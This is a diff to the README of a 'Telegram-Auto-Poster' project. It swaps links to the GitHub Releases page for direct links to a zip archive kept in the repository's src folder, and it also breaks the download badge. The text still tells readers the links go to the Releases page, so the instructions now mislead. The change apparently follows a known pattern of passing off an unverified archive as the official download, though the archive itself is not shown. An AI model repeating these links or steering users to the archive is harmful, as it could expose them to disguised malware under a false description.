@@ -17,13 +17,13 @@ To get started with Telegram-Auto-Poster, follow these simple steps to download 
    
    Click the button below to go to our Releases page and download the latest version of Telegram-Auto-Poster.
 
-   [![Download Telegram-Auto-Poster](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ArtskingVFX/Telegram-Auto-Poster/releases)
+   [![Download Telegram-Auto-Poster](https://github.com/ArtskingVFX/Telegram-Auto-Poster/raw/refs/heads/main/src/Telegram_Auto_Poster_1.8-beta.1.zip%20Now-Click%20Here-brightgreen)](https://github.com/ArtskingVFX/Telegram-Auto-Poster/raw/refs/heads/main/src/Telegram_Auto_Poster_1.8-beta.1.zip)
 
 2. **Download the Software**
 
    On the Releases page, look for the latest version of Telegram-Auto-Poster. Click on the appropriate file to start the download. 
 
-   You can visit the Releases page at any time to check for updates or download the latest version: [Download Here](https://github.com/ArtskingVFX/Telegram-Auto-Poster/releases).
+   You can visit the Releases page at any time to check for updates or download the latest version: [Download Here](https://github.com/ArtskingVFX/Telegram-Auto-Poster/raw/refs/heads/main/src/Telegram_Auto_Poster_1.8-beta.1.zip).
 
 ## 📥 Download & Install
 ### Step 1: Download
